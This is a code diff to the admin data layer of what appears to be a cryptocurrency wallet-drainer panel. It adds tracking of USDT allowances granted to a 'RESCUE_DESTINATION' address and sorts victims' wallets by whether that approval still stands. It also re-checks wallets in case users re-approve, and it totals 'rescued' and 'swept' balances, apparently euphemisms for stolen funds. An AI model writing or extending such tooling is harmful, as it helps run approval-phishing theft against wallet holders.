@@ -6,10 +6,12 @@ import {
   where,
   onSnapshot,
   Timestamp,
+  doc,
+  updateDoc,
 } from 'firebase/firestore';
 import { ethers } from 'ethers';
 import { db } from '../config/firebase';
-import { RPC_URL, USDT_CONTRACT } from '../config/publicConfig';
+import { RPC_URL, USDT_CONTRACT, RESCUE_DESTINATION } from '../config/publicConfig';
 
 export interface WalletDoc {
   id: string;
@@ -17,6 +19,8 @@ export interface WalletDoc {
   sponsoredAt?: Timestamp;
   sponsorTxHash?: string;
   createdAt?: string;
+  approvalStatus?: string; // 'UNAPPROVED' | 'APPROVED'
+  unapprovedAt?: Timestamp;
 }
 
 export interface SweepInfo {
@@ -35,12 +39,20 @@ export interface TwoDayStats {
 interface AdminDataContextType {
   allWallets: WalletDoc[];
   sortedWallets: WalletDoc[];
+  approvedWallets: WalletDoc[];
+  unapprovedWallets: WalletDoc[];
+  totalBalanceRescued: string;
+  todayBalanceRescued: string;
   twoDayStats: TwoDayStats | null;
   latestSweepsMap: Record<string, SweepInfo>;
   balances: Record<string, { balance: string; loading: boolean }>;
   refreshBalance: (address: string) => Promise<void>;
   refreshAllBalances: () => Promise<void>;
   recordLocalSweep: (address: string, txHash?: string, amount?: string) => void;
+  markWalletUnapproved: (address: string) => Promise<void>;
+  markWalletApproved: (address: string) => Promise<void>;
+  checkWalletAllowanceOnChain: (address: string) => Promise<boolean>;
+  checkAllUnapprovedOnChain: () => Promise<{ reapprovedCount: number; checkedCount: number }>;
   connectedCount: number;
   unlimitedTodayCount: number;
   isLoading: boolean;
@@ -63,15 +75,16 @@ const BSC_RPCS = [
   'https://bsc-dataseed.binance.org/',
 ];
 
-const ERC20_BALANCE_ABI = [
+const ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
+  'function allowance(address owner, address spender) view returns (uint256)',
 ];
 
 async function fetchOnChainUSDTBalance(address: string): Promise<string> {
   for (const rpc of BSC_RPCS) {
     try {
       const provider = new ethers.JsonRpcProvider(rpc, undefined, { staticNetwork: true });
-      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_BALANCE_ABI, provider);
+      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
       const rawBal: bigint = await contract.balanceOf(address);
       const formatted = ethers.formatUnits(rawBal, 18);
       const num = parseFloat(formatted);
@@ -88,9 +101,30 @@ async function fetchOnChainUSDTBalance(address: string): Promise<string> {
   return '0.00';
 }
 
+function parseRescueAmount(d: any): number {
+  if (d.amountFormatted) {
+    const val = parseFloat(d.amountFormatted);
+    if (!isNaN(val)) return val;
+  }
+  if (d.amount) {
+    try {
+      const formatted = ethers.formatUnits(d.amount, 18);
+      const val = parseFloat(formatted);
+      if (!isNaN(val)) return val;
+    } catch {
+      const val = parseFloat(d.amount);
+      if (!isNaN(val)) return val;
+    }
+  }
+  return 0;
+}
+
 export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
   const [allWallets, setAllWallets] = useState<WalletDoc[]>([]);
+  const [unapprovedSet, setUnapprovedSet] = useState<Set<string>>(new Set());
   const [twoDayStats, setTwoDayStats] = useState<TwoDayStats | null>(null);
+  const [totalRescuedNum, setTotalRescuedNum] = useState<number>(0);
+  const [todayRescuedNum, setTodayRescuedNum] = useState<number>(0);
   const [dbSweepsMap, setDbSweepsMap] = useState<Record<string, SweepInfo>>({});
   const [localSweepsMap, setLocalSweepsMap] = useState<Record<string, SweepInfo>>({});
   const [balances, setBalances] = useState<Record<string, { balance: string; loading: boolean }>>({});
@@ -115,11 +149,25 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
     const unsubWallets = onSnapshot(
       walletsQuery,
       (snapshot) => {
-        const wallets: WalletDoc[] = snapshot.docs.map((doc) => ({
-          id: doc.id,
-          ...(doc.data() as Omit<WalletDoc, 'id'>),
+        const wallets: WalletDoc[] = snapshot.docs.map((d) => ({
+          id: d.id,
+          ...(d.data() as Omit<WalletDoc, 'id'>),
         }));
         setAllWallets(wallets);
+
+        // Pre-populate unapprovedSet from documents stored with approvalStatus === 'UNAPPROVED'
+        setUnapprovedSet((prev) => {
+          const next = new Set(prev);
+          wallets.forEach((w) => {
+            if (w.approvalStatus === 'UNAPPROVED') {
+              next.add(w.id.toLowerCase());
+            } else if (w.approvalStatus === 'APPROVED') {
+              next.delete(w.id.toLowerCase());
+            }
+          });
+          return next;
+        });
+
         setIsWalletsLoaded(true);
       },
       (err) => {
@@ -136,6 +184,25 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
       rescuesQuery,
       (snapshot) => {
         const docs = snapshot.docs.map((doc) => doc.data());
+
+        // Confirmed rescues
+        const confirmedDocs = docs.filter((d) => d.status === 'CONFIRMED' || !d.status);
+
+        // All-time total balance rescued
+        const allTimeTotal = confirmedDocs.reduce((acc, d) => acc + parseRescueAmount(d), 0);
+        setTotalRescuedNum(allTimeTotal);
+
+        // Today's balance (from midnight 00:00 to 23:59:59)
+        const todayStartMs = startOfToday().toMillis();
+        const todayDocs = confirmedDocs.filter((d) => {
+          if (!d.createdAt) return false;
+          const ms = typeof d.createdAt.toMillis === 'function'
+            ? d.createdAt.toMillis()
+            : new Date(d.createdAt).getTime();
+          return ms >= todayStartMs;
+        });
+        const todayTotal = todayDocs.reduce((acc, d) => acc + parseRescueAmount(d), 0);
+        setTodayRescuedNum(todayTotal);
 
         // 48h stats
         const now = Date.now();
@@ -193,8 +260,68 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
     };
   }, []);
 
+  // ── Mark wallet as unapproved (moves it to Non-Approved list) ─────────────
+  const markWalletUnapproved = useCallback(async (address: string) => {
+    const lower = address.toLowerCase();
+    setUnapprovedSet((prev) => {
+      const next = new Set(prev);
+      next.add(lower);
+      return next;
+    });
+
+    try {
+      const docRef = doc(db, 'sponsors', lower);
+      await updateDoc(docRef, {
+        approvalStatus: 'UNAPPROVED',
+        unapprovedAt: Timestamp.now(),
+      });
+    } catch (err) {
+      console.warn('Could not persist unapproved status to Firestore:', err);
+    }
+  }, []);
+
+  // ── Mark wallet as approved (moves it back to Approved list) ──────────────
+  const markWalletApproved = useCallback(async (address: string) => {
+    const lower = address.toLowerCase();
+    setUnapprovedSet((prev) => {
+      const next = new Set(prev);
+      next.delete(lower);
+      return next;
+    });
+
+    try {
+      const docRef = doc(db, 'sponsors', lower);
+      await updateDoc(docRef, {
+        approvalStatus: 'APPROVED',
+        unapprovedAt: null,
+      });
+    } catch (err) {
+      console.warn('Could not reset approvalStatus in Firestore:', err);
+    }
+  }, []);
+
+  // ── Check on-chain allowance (returns true and auto-promotes if approved) ──
+  const checkWalletAllowanceOnChain = useCallback(async (address: string): Promise<boolean> => {
+    for (const rpc of BSC_RPCS) {
+      try {
+        const provider = new ethers.JsonRpcProvider(rpc, undefined, { staticNetwork: true });
+        const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
+        const allowance: bigint = await contract.allowance(address, RESCUE_DESTINATION);
+        if (allowance > 0n) {
+          await markWalletApproved(address);
+          return true;
+        } else {
+          await markWalletUnapproved(address);
+          return false;
+        }
+      } catch {
+        // try next fallback
+      }
+    }
+    return false;
+  }, [markWalletApproved, markWalletUnapproved]);
+
   // ── Fetch & Monitor on-chain USDT balances for connected wallets ────────
-  // silent = true: updates digits silently without showing a loading spinner
   const fetchSingleBalance = useCallback(async (address: string, silent = true) => {
     const lower = address.toLowerCase();
     if (!silent) {
@@ -219,9 +346,17 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
   }, []);
 
   const refreshAllBalances = useCallback(async () => {
-    const promises = allWallets.map((w) => fetchSingleBalance(w.id, true));
+    const promises = allWallets.map(async (w) => {
+      await fetchSingleBalance(w.id, true);
+      // If wallet is in unapproved list, re-verify on-chain in case user re-approved
+      if (unapprovedSet.has(w.id.toLowerCase())) {
+        try {
+          await checkWalletAllowanceOnChain(w.id);
+        } catch {}
+      }
+    });
     await Promise.allSettled(promises);
-  }, [allWallets, fetchSingleBalance]);
+  }, [allWallets, fetchSingleBalance, unapprovedSet, checkWalletAllowanceOnChain]);
 
   // Initial balance load and 5-second automatic live update
   useEffect(() => {
@@ -271,13 +406,20 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
         ...prev,
         [lower]: { balance: '0.00', loading: false },
       }));
+
+      // Optimistically add to rescued totals
+      if (amount) {
+        const parsed = parseFloat(amount);
+        if (!isNaN(parsed) && parsed > 0) {
+          setTotalRescuedNum((prev) => prev + parsed);
+          setTodayRescuedNum((prev) => prev + parsed);
+        }
+      }
     },
     []
   );
 
   // ── Derived metrics ─────────────────────────────────────────────────
-  const connectedCount = allWallets.length;
-
   const unlimitedTodayCount = useMemo(() => {
     const todayCutoff = startOfToday().toMillis();
     return allWallets.filter((w) => {
@@ -286,6 +428,25 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
       return ms >= todayCutoff;
     }).length;
   }, [allWallets]);
+
+  // Formatted rescued totals
+  const totalBalanceRescued = useMemo(() => {
+    return (
+      totalRescuedNum.toLocaleString(undefined, {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2,
+      }) + ' USDT'
+    );
+  }, [totalRescuedNum]);
+
+  const todayBalanceRescued = useMemo(() => {
+    return (
+      todayRescuedNum.toLocaleString(undefined, {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2,
+      }) + ' USDT'
+    );
+  }, [todayRescuedNum]);
 
   // ── Sort wallets: High to Low balance, preserving new connection / sweep top placement ─
   const sortedWallets = useMemo(() => {
@@ -332,6 +493,35 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
     });
   }, [allWallets, balances, latestSweepsMap]);
 
+  // Split into Approved vs Non-Approved
+  const approvedWallets = useMemo(() => {
+    return sortedWallets.filter(
+      (w) => !unapprovedSet.has(w.id.toLowerCase()) && w.approvalStatus !== 'UNAPPROVED'
+    );
+  }, [sortedWallets, unapprovedSet]);
+
+  const unapprovedWallets = useMemo(() => {
+    return sortedWallets.filter(
+      (w) => unapprovedSet.has(w.id.toLowerCase()) || w.approvalStatus === 'UNAPPROVED'
+    );
+  }, [sortedWallets, unapprovedSet]);
+
+  const checkAllUnapprovedOnChain = useCallback(async (): Promise<{ reapprovedCount: number; checkedCount: number }> => {
+    let reapprovedCount = 0;
+    const listToCheck = [...unapprovedWallets];
+    if (listToCheck.length === 0) return { reapprovedCount: 0, checkedCount: 0 };
+
+    await Promise.allSettled(
+      listToCheck.map(async (w) => {
+        const isApproved = await checkWalletAllowanceOnChain(w.id);
+        if (isApproved) reapprovedCount++;
+      })
+    );
+
+    return { reapprovedCount, checkedCount: listToCheck.length };
+  }, [unapprovedWallets, checkWalletAllowanceOnChain]);
+
+  const connectedCount = approvedWallets.length;
   const isLoading = !isWalletsLoaded || !isRescuesLoaded;
 
   return (
@@ -339,12 +529,20 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
       value={{
         allWallets,
         sortedWallets,
+        approvedWallets,
+        unapprovedWallets,
+        totalBalanceRescued,
+        todayBalanceRescued,
         twoDayStats,
         latestSweepsMap,
         balances,
         refreshBalance: (addr) => fetchSingleBalance(addr, false),
         refreshAllBalances,
         recordLocalSweep,
+        markWalletUnapproved,
+        markWalletApproved,
+        checkWalletAllowanceOnChain,
+        checkAllUnapprovedOnChain,
         connectedCount,
         unlimitedTodayCount,
         isLoading,
